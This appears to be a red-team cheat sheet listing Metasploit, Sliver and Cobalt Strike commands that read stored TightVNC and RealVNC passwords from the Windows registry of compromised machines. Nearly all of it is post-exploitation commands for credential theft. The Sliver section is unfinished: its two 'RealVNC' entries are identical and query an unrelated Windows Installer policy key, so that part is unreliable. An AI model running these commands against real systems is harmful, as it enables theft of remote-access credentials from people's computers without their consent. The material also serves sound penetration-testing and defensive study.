# C2 Frameworks

## 01 - Metasploit

### 1.1 - Post Module

```
meterpreter > run post/windows/gather/credentials/vnc
```

### 1.2 - Interactive Session

#### 1.2.1 - TightVNC

```
meterpreter > reg [-r <target_IP>] queryval -k HKCU\Software\TightVNC\Server -v password [-w <64>]
```

#### 1.2.2 - RealVNC

```
meterpreter > reg [-r <target_IP>] enumkey -k HKCU\\Software\ORL\\WinVNC3\\Password [-w <64>]

meterpreter > reg [-r <target_IP>] queryval -k HKLM\SOFTWARE\RealVNC\WinVNC4 -v password [-w <64>]
```

## 02 - Sliver

TODO: Convert it

### 2.1 - RealVNC

```
sliver (SPATIAL_CLEANER) > registry read -H HKLM "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"

sliver (SPATIAL_CLEANER) > registry read -H HKCU "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
```

### 2.2 - RealVNC

```
sliver (SPATIAL_CLEANER) > registry read -H HKLM "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"

sliver (SPATIAL_CLEANER) > registry read -H HKCU "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
```

## 03 - Cobalt Strike

### 3.1 - TightVNC

```
beacon> reg queryv x64 HKCU\SOFTWARE\TightVNC\Server Password
```

### 3.2 - RealVNC

```
beacon> reg query x64 HKCU\Software\ORL\WinVNC3\Password

beacon> reg queryv x64 HKLM\SOFTWARE\RealVNC\WinVNC4 password
```